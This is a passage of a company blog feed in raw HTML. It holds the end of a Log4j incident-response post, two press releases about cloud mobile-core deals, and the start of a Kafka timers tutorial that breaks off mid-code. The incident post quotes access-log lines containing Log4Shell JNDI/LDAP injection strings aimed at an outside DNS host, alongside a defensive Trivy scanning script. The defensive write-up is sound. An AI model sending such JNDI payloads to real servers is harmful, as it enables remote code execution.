255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">divd-0c1679670abeeb68eeabd98981713eea_${date</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">YYYYMMddHHmmss}</span><span class="token string" style="color:rgb(195, 232, 141)">_https_Referer.log4jdns.x00.it/}"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">divd-0c1679670abeeb68eeabd98981713eea_${date</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">YYYYMMddHHmmss}</span><span class="token string" style="color:rgb(195, 232, 141)">_https_User-Agent.log4jdns.x00.it/}"</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">4496</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.255</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain">monitoring-mki-lab-grafana-80</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">100.115</span><span class="token plain">.164.63:3000 </span><span class="token number" style="color:rgb(247, 140, 108)">39</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.001</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">401</span><span class="token plain"> d7fa702ee8cc73793707ca6720c57639 </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">194.5</span><span class="token plain">.73.6</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>In the coming weeks we will continue to monitor the probes across our public infrastructure to see how they evolve.</p><h1>Monday</h1><h2 class="anchor anchorWithStickyNavbar_mojV" id="docker-vulnerability-scans">Docker Vulnerability Scans<a class="hash-link" href="#docker-vulnerability-scans" title="Direct link to heading">​</a></h2><p>Next, we wanted to ensure there was not an application running in our Kubernetes clusters with a vulnerable version of Log4j. We know from <a href="https://github.com/cisagov/log4j-affected-db" target="_blank" rel="noopener noreferrer">this resource</a> that there are many open source applications that are vulnerable. To ensure we are not running a tool that is vulnerable, we used Kubernetes API with <a href="https://github.com/kubernetes/kubectl" target="_blank" rel="noopener noreferrer">kubectl</a> and <a href="https://github.com/aquasecurity/trivy" target="_blank" rel="noopener noreferrer">Trivy</a>, a scanner for vulnerabilities in container images.</p><p>First, we built a small POC to ensure that Trivy can identify the CVE-2021-44228.</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">❯❯❯ brew </span><span class="token function" style="color:rgb(130, 170, 255)">install</span><span class="token plain"> aquasecurity/trivy/trivy</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">❯❯❯ trivy image birdyman/log4j2-demo:1.0.0-12 </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">grep</span><span class="token plain"> CVE-2021-44228</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> org.apache.logging.log4j:log4j-api                     </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> CVE-2021-44228   </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> CRITICAL </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">2.10</span><span class="token plain">.0            </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">2.15</span><span class="token plain">.0                         </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> Remote code injection </span><span class="token keyword" style="font-style:italic">in</span><span class="token plain"> Log4j                                                  </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Now that we know Trivy works, let’s create a small bash script to call Kubectl and Trivy and grep for the Log4j CVE.</p><p><code>trivy-scan-cve.sh CVE-2021-44228</code></p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token shebang important">#!/usr/bin/env bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token assign-left variable" style="color:rgb(191, 199, 213)">VULN</span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable" style="color:rgb(191, 199, 213)">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"Scanning </span><span class="token string variable" style="color:rgb(191, 199, 213)">$1</span><span class="token string" style="color:rgb(195, 232, 141)">..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token assign-left variable" style="color:rgb(191, 199, 213)">imgs</span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token variable" style="color:rgb(191, 199, 213)">kubectl get pods -A -o </span><span class="token variable assign-left variable" style="color:rgb(191, 199, 213)">jsonpath</span><span class="token variable operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable string" style="color:rgb(195, 232, 141)">'{range .items[*]}{.spec.containers[*].image}{" "}'</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable operator" style="color:rgb(137, 221, 255)">|</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable function" style="color:rgb(130, 170, 255)">tr</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable string" style="color:rgb(195, 232, 141)">" "</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable string" style="color:rgb(195, 232, 141)">"</span><span class="token variable string entity" style="color:rgb(195, 232, 141)">\n</span><span class="token variable string" style="color:rgb(195, 232, 141)">"</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable operator" style="color:rgb(137, 221, 255)">|</span><span class="token variable" style="color:rgb(191, 199, 213)"> </span><span class="token variable function" style="color:rgb(130, 170, 255)">sort</span><span class="token variable" style="color:rgb(191, 199, 213)"> -u</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:rgb(191, 199, 213)">img</span><span class="token plain"> </span><span class="token keyword" style="font-style:italic">in</span><span class="token plain"> </span><span class="token variable" style="color:rgb(191, 199, 213)">${imgs}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"> </span><span class="token keyword" style="font-style:italic">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"scanning </span><span class="token string variable" style="color:rgb(191, 199, 213)">${img}</span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token assign-left variable" style="color:rgb(191, 199, 213)">result</span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token variable" style="color:rgb(191, 199, 213)">trivy image --severity CRITICAL $</span><span class="token variable punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token variable" style="color:rgb(191, 199, 213)">img</span><span class="token variable punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token keyword" style="font-style:italic">if</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> </span><span class="token variable" style="color:rgb(191, 199, 213)">${result}</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">grep</span><span class="token plain"> -q </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">$1</span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"> </span><span class="token keyword" style="font-style:italic">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> -e </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">${img}</span><span class="token string" style="color:rgb(195, 232, 141)"> is vulnerable, please patch!"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token keyword" style="font-style:italic">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">done</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>We ran the above script across all of our Kubernetes clusters. This was helpful as we then found some additional test services which included the vulnerable Log4j library. These vulnerable services were based on 3rd party open-source applications, therefore we were not able to identify them earlier when looking just through the code dependencies. We took the necessary actions to remediate these services and investigate that there was no malicious traffic from these pods.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="monitoring-vendors">Monitoring Vendors<a class="hash-link" href="#monitoring-vendors" title="Direct link to heading">​</a></h2><p>It is important to note that because we operate in the cloud and also use some vendor components in our mobile core network, we needed to ensure these core components were not affected by Log4j vulnerabilities. In our case, we followed the AWS and Cisco Security Bulletins and update our components when required.</p><h1>What worked well and could be improved</h1><p>During this incident management we have gathered great learnings in the way.</p><p>First of all, our GitOps and centralized software repositories have been critical to remediate very quickly to the vulnerability, enabling us to quickly deploy across our entire infrastructure new components, without interrupting operations or losing any log information in the process.</p><p>Second, while our monorepo and automated scan helped us a lot to identify vulnerable components, they still depend on the availability of up-to-date information. During that incident, we noticed that it was often difficult to rely on those 3rd party components to address a 0day risk. Therefore, we will rely on improving our defense-in-depth by verifying that unnecessary code execution is systematically disabled in our runtimes, improve the sanity of our container images by adopting best practices of the cloud industry.</p><h1>Staying secure</h1><p>All in all, it is important that we have the ability to plan, identify, contain and prevent zero-day vulnerabilities such as Log4j. We only spoke about some of the controls we have in place, but we are continuing to explore new technologies and mechanisms to ensure we build and maintain a secure environment.</p><h1>We are hiring</h1><p>If you are a Security Engineer looking for a new challenge to make a secure mobile core platform, come and say hi. <a href="https://wgtwo.jobs.personio.de/job/423396?display=en" target="_blank" rel="noopener noreferrer">https://wgtwo.jobs.personio.de/job/423396?display=en</a></p>]]></content>
        <author>
            <name>Jonnathan Griffin</name>
            <uri>https://www.linkedin.com/in/jonnathangriffin/</uri>
        </author>
        <author>
            <name>Yan Grunenberger</name>
            <uri>https://www.linkedin.com/in/yangrunenberger/</uri>
        </author>
        <category label="security" term="security"/>
        <category label="infrastructure" term="infrastructure"/>
        <category label="vulnerability" term="vulnerability"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[CKH IOD selects Working Group Two for public cloud core network]]></title>
        <id>ckh-iod-wg2-public-cloud</id>
        <link href="https://www.wgtwo.com/blog/ckh-iod-wg2-public-cloud"/>
        <updated>2021-12-01T12:00:00.000Z</updated>
        <summary type="html"><![CDATA[CKH IOD migrates its core network to the cloud – delivered as a fully managed software-as-a-service by Working Group Two and deployed on AWS]]></summary>
        <content type="html"><![CDATA[<img src="/img/ckh.png" alt="ckh" width="300"><ul><li>As an industry-first, CKH IOD migrates its core network to the cloud – delivered as a fully managed software-as-a-service by Working Group Two and deployed on AWS</li><li>A cloud-based core network brings radical simplification, cost efficiency and a platform to leverage a developer community – to drive innovation and capitalize on disruptive technologies</li></ul><p><strong>Oslo/London, 1 December, 2021</strong> – CKH Innovations Opportunities Development (CKH IOD) has entered into a contract with Working Group Two to move its core network to the public cloud. CKH IOD, a telecoms unit and international development hub of CK Hutchison, via a fully managed SaaS by Working Group Two, will deploy its mobile core network on Amazon Web Services (AWS). The agreement means that CKH IOD, and its MVNO, IoT and Private Network customers, can achieve radical simplification, speed up innovation, explore new revenue streams and get to market faster.</p><p>CKH IOD will leverage Working Group Two’s platform to deliver services across the CK Hutchison telecoms footprint in Europe, Asia and its wider international partners.</p><p>By evolving to a software-defined network, CKH IOD radically consolidates its vendor relationships and associated complexities. Working Group Two’s fully managed mobile core network also automates operations and maintenance to deliver a more cost-efficient service.</p><p>“Our collaboration with Working Group Two to deploy our core network on the public cloud delivers simplicity, improved operational efficiency and the ability to quickly develop new initiatives to meet market needs, with particular focus on the MVNO, IoT and Private Network space. It’s about achieving scale and the highest levels of security while reducing complexity – to the benefit of our customers and ultimately, end-users in our markets,” says Joe Parker, CEO of CKH IOD.</p><p>“CKH IOD earns a first-mover advantage by deploying a core built leveraging the webscale playbook. Being built on the cloud and delivered as-a-service, this core enables simplicity, cost efficiency and a continuous evolution of capabilities and features – with no end-of-life. In addition, they get access to a community of partners that build and integrate into the cloud core, giving a vastly enhanced pace of innovation. Under the umbrella of “everything as-a-service” the time has come to include the core network. We are incredibly excited to announce this landmark agreement,” says Erlend Prestgard, CEO of Working Group Two.</p><p>Working Group Two leverages the proven infrastructure and breadth of services from AWS to deploy a cloud-native core network.</p><p>“Working Group Two is a pioneer in building mobile core networks with much of the same philosophy that AWS builds infrastructure. Scalable, secure, consistent and API-driven, delivering the promise of efficiency and rapid innovation at scale,” says David Brown, VP and GM of Amazon EC2.</p><p>“With CKH IOD deciding to host its core network on the public cloud and have it fully managed by a third party under a managed SaaS model, we are witnessing a significant technology shift. By opting for a full set of capabilities from AWS, CKH IOD and Working Group Two can leverage the full benefits of the public cloud, including opening up for new business models. This will allow CKH IOD to scale their services and offerings with superior visibility and control. They will be stimulating a rapid pace of innovation with the highest levels of security and performance,” says Fabio Cerone, Managing Director EMEA, Telco Business Unit at AWS.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="about-ckh-innovations-opportunities-development">About CKH Innovations Opportunities Development<a class="hash-link" href="#about-ckh-innovations-opportunities-development" title="Direct link to heading">​</a></h3><p>CKH Innovations Opportunities Development is a telecom unit and international development hub of CK Hutchison, creating international and global technological innovations that are built on one of CK Hutchison’s strongest assets, our mobile networks. We offer customised global mobile communications and data solutions that create new digital value and unprecedented opportunities for business. Our collaborative approach combined with our world-class network and experience means we are best placed to help our customers design, adapt, develop and scale solutions faster. Read more at <a href="https://www.ckhiod.com" target="_blank" rel="noopener noreferrer">https://www.ckhiod.com</a></p><h3 class="anchor anchorWithStickyNavbar_mojV" id="about-working-group-two">About Working Group Two<a class="hash-link" href="#about-working-group-two" title="Direct link to heading">​</a></h3><p>Working Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency – leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. Read more at <a href="https://wgtwo.com" target="_blank" rel="noopener noreferrer">https://wgtwo.com</a></p><h3 class="anchor anchorWithStickyNavbar_mojV" id="for-more-information">For more information<a class="hash-link" href="#for-more-information" title="Direct link to heading">​</a></h3><p>Erlend Prestgard, CEO, Working Group Two, +47 4542 9555, <a href="mailto:erlend@wgtwo.com" target="_blank" rel="noopener noreferrer">erlend@wgtwo.com</a></p>]]></content>
        <author>
            <name>Erlend Prestgard</name>
            <uri>https://www.linkedin.com/in/erlend-prestgard-ab47101/</uri>
        </author>
        <category label="press release" term="press release"/>
        <category label="telco" term="telco"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Mitsui Knowledge Industry (MKI) to develop private networks business]]></title>
        <id>mitsui-knowledge-industry-mki-private-networks-business</id>
        <link href="https://www.wgtwo.com/blog/mitsui-knowledge-industry-mki-private-networks-business"/>
        <updated>2021-06-01T12:00:00.000Z</updated>
        <summary type="html"><![CDATA[Drive the Private NWs Growth with its Fully-Managed Mobile Core NW SaaS]]></summary>
        <content type="html"><![CDATA[<img src="/img/mki.png" alt="mki" width="300"><p>— Drive the Private NWs Growth with its Fully-Managed Mobile Core NW SaaS —</p><p>CEO Erlend Prestgard of Working Group Two As, Oslo, Norway and President Kengo Asano of Mitsui Knowledge Industry Co., Ltd. Minato-ku, Japan, agreed on an MoU on providing WG2’s fully-managed Mobile Core NW SaaS product to accelerate the Private Networks business in the Japanese market.</p><p>In the Japanese market, there is a clear interest in Private NWs due to the regulatory setup of Private LTE and Local 5G. However, there are complex issues to overcome and Private NWs require professional knowledge to acquire a radio license, to design and operate the Core Network, and to optimize the Radio Network, all with reasonable cost. The MKI-WG2 agreement solves these problems:</p><ul><li>One-stop solution from client’s radio license acquisition to operational support</li><li>WG2’s Mobile Core NW built with a web-scale IT approach to simplify financial and operational aspects of the mobile system</li><li>Parties will encourage and enable the Private NW operators to create new business</li><li>MKI will provide WG2’s Mobile Core SaaS as part of its offering as well as reselling it to other integrators to create a larger ecosystem</li><li>MKI has radio network knowledge, and WG2 provides Mobile Core as a service (SaaS) that radically improves the cost model. With this partnership, both parties will combine those strengths and lift the Private NWs business to the next level.</li></ul><blockquote><p>“Together with MKI, we make the journey of launching feature-rich private networks simple and affordable. MKI’s strong local presence and Working Group Two’s ability to distill complex core networks into simple-to-use APIs allow customers to launch full-service mobile networks at a small scale – with market-leading affordability,” said Erlend Prestgard, CEO and Co-Founder of Working Group Two.</p></blockquote><h2 class="anchor anchorWithStickyNavbar_mojV" id="about-working-group-two-wgtwo">About Working Group Two (wgtwo)<a class="hash-link" href="#about-working-group-two-wgtwo" title="Direct link to heading">​</a></h2><p>WG2 has rebuilt the mobile core for simplicity, innovation, and efficiency – leveraging the web-scale playbook and operating models. Today, WG2’s innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all G’s.</p><p>Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services.</p><p>WG2 is an Advanced Technology Partner of AWS: <a href="https://partners.amazonaws.com/partners/0010h00001ZY6fDAAT/Working%20Group%20Two%20As" target="_blank" rel="noopener noreferrer">https://partners.amazonaws.com/partners/0010h00001ZY6fDAAT/Working%20Group%20Two%20As</a></p><p>WG2 Website: <a href="https://wgtwo.com" target="_blank" rel="noopener noreferrer">https://wgtwo.com</a></p><h3 class="anchor anchorWithStickyNavbar_mojV" id="about-mitsui-knowledge-industry-mki">About Mitsui Knowledge Industry (MKI)<a class="hash-link" href="#about-mitsui-knowledge-industry-mki" title="Direct link to heading">​</a></h3><p>Under the slogan “Unite Knowledge, Ignite the Future”, Mitsui Knowledge Industry Co., Ltd. (MKI)  has been creating IT strategies and supporting the digital transformation of its clients as their strategic business partner specializing mainly in information and communication technology. By utilizing its wealth of “KNOWLEDGE” accumulated through its long experience in technological development and innovation continuing for over half a century, MKI remains consistent in its pursuit to live up to the high expectations of its customers as their most reliable “value creator”.</p><p>MKI Website: <a href="https://www.mki.co.jp/english/about/" target="_blank" rel="noopener noreferrer">https://www.mki.co.jp/english/about/</a></p><p>Published: June 1, 2021</p>]]></content>
        <author>
            <name>Naoya Ori</name>
            <uri>https://www.linkedin.com/in/naoya-ori-093482/</uri>
        </author>
        <category label="press release" term="press release"/>
        <category label="mki" term="mki"/>
        <category label="private networks" term="private networks"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Kafka timers]]></title>
        <id>kafka-timers</id>
        <link href="https://www.wgtwo.com/blog/kafka-timers"/>
        <updated>2021-02-28T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[A timer is a cornerstone of any software that communicates over the network. There are plenty of implementations]]></summary>
        <content type="html"><![CDATA[<p>A timer is a cornerstone of any software that communicates over the network. There are plenty of implementations
that provide a timer facility. Most of them are in memory and will lose scheduled timers should the application crash.
In this blog we discuss durable Kafka timers that do not depend on in memory state. By design
we shall assume 1 second resolution of these timers.</p><p>Before taking on timers let's cover some Kafka basics.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="kafka-concepts">Kafka concepts<a class="hash-link" href="#kafka-concepts" title="Direct link to heading">​</a></h2><p>There are a few Kafka concepts in play to simulate timers - Kafka topic, Kafka stream, Kafka streams library.
Where <em>topic</em> is append only log of events, <em>stream</em> is a cache of N most recent events on the <em>topic</em>,
and the <em>streams library</em> is a software library implementing the concept of the <em>stream</em>.</p><p>A kafka topic resides inside the Kafka servers, but Kafka streams library keeps track of a topic's most recent
events on the application side - the stream. The stream is a key/value cache with random read access unlike
append only topic log. Key/value cache is not the only thing the library provides. It can also join
the streams. When an event and its key appear on a stream, the library looks up the same key in the other streams participating in the join.
It is using key/value cache associated with each stream and gives the result to the application.
The result will have the present event enriched with the matched past events from the joined streams.
Joining two streams will yield the timer callback. Let's see how.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="implementation">Implementation<a class="hash-link" href="#implementation" title="Direct link to heading">​</a></h2><p>Since it is Kafka, timer expiration shall result in an event posted on a topic of user's choice at the right time.
This event is delayed until due time by joining two streams: <em>oscillator</em> and <em>timer-request</em>. Callback
event is pushed to <em>timer-request</em> topic with key equal to the expiration timestamp. Oscillator topic
is the clock dial counting seconds since UNIX epoch in real time. At some point it will get to the second
which is equal to the key on <em>timer-request</em> topic, and the join will come up with the callback event.</p><p>An excellent summary on "timer wheel" and other timer algorithms can be found in this linux kernel <a href="https://lwn.net/Articles/156329/" target="_blank" rel="noopener noreferrer">thread</a>.
Our implementation of timers using Kafka resembles the "timer wheel" algorithm with a bucket on each second to keep callbacks.
<em>Oscillator</em> topic models rotating clock dial, <em>timer-request</em> is bucketing callbacks by the expiration timestamp, and join of these two
contains content of the expired bucket with all the callbacks in it.</p><p><img src="/assets/images/kt-d3c8c75ee99a5f0c4b9fc155ad9418ea.png" width="1024" height="492"></p><p>There are two Kafka applications running together to service these topics:</p><ul><li>Oscillator</li><li>Futures</li></ul><h3 class="anchor anchorWithStickyNavbar_mojV" id="oscillator">Oscillator<a class="hash-link" href="#oscillator" title="Direct link to heading">​</a></h3><p>With the resolution of 1 second oscillator keeps pushing <em>oscillator</em> topic:</p><div class="codeBlockContainer_I0IT language-kotlin theme-code-block"><div class="codeBlockContent_wNvx kotlin"><pre tabindex="0" class="prism-code language-kotlin codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">while (running) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    val nowSeconds = System.currentTimeMillis() / 1000L</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    while (timestampSeconds &lt; nowSeconds) {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        timestampSeconds++</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        KafkaProducers.send(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            "oscillator",</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            timestampSeconds.toString(),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            "1"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Thread.sleep(200)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="futures">Futures<a class="hash-link" href="#futures" title="Direct link to heading">​</a></h3><p>When requesting a timer by pushing <em>timer-request</em> topic, the user provides a callback structure
used to dispatch timer event:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">message Future {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    string callBackTopic = 1;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    string callBackKey = 2;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    bytes callBack = 3;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Joining two streams on the key equal to the UNIX second will give all expired timers, and
their callback coordinates.</p><p>First, setup a join with <em>WINDOW_SIZE</em> large enough to cover the longest timer duration</p><div class="codeBlockContainer_I0IT language-kotlin theme-code-block"><div class="codeBlockContent_wNvx kotlin"><pre tabindex="0" class="prism-code language-kotlin codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">val oscillator = builder.stream&lt;String, String&gt;("oscillator")</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">val timerRequest = builder.stream("timer-request", Consumed.with(Serdes.String(), FutureSerde()))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">val timeoutEvents =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    oscillator.join(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            timerRequest,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            { _: String?, future: Future -&gt; future },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            JoinWindows.of(WINDOW_SIZE),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            StreamJoined.with(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    Serdes.String(),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    Serdes.String(),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    FutureSerde()</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            ).withThisStoreSupplier(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    Stores.persistentWindowStore(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            "join-this-store",</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            WINDOW_SIZE.plusMinutes(30),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            WINDOW_SIZE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            ).withOtherStoreSupplier(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    Stores.persistentWindowStore(</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            "join-other-store",</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            WINDOW_SIZE.plusMinutes(30),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            WINDOW_SIZE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                            true</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                    )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    )</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Second, kick of the processing loop looking for expired timers</p><div class="codeBlockContainer_I0IT language-kotlin theme-code-block"><div class="codeBlockContent_wNvx kotlin"><pre tabindex="0" class="prism-code language-kotlin codeBlock_jd64 thin-scrollbar" 